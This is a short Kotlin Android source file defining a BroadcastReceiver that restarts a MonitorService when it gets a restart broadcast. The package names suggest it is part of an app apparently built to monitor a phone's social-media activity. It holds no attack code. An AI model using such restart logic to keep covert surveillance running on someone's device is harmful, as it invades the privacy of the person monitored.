package com.github.muneebwanee.dash.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.github.muneebwanee.dash.services.social.MonitorService
import com.github.muneebwanee.dash.utils.Consts.RESTART_MONITOR_RECEIVER
import com.pawegio.kandroid.IntentFor

/**
 * Created by muneebwanee on 15/12/20.
 */
class MonitorReceiver : BroadcastReceiver(){
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == RESTART_MONITOR_RECEIVER) context.startService(IntentFor<MonitorService>(context))
    }
}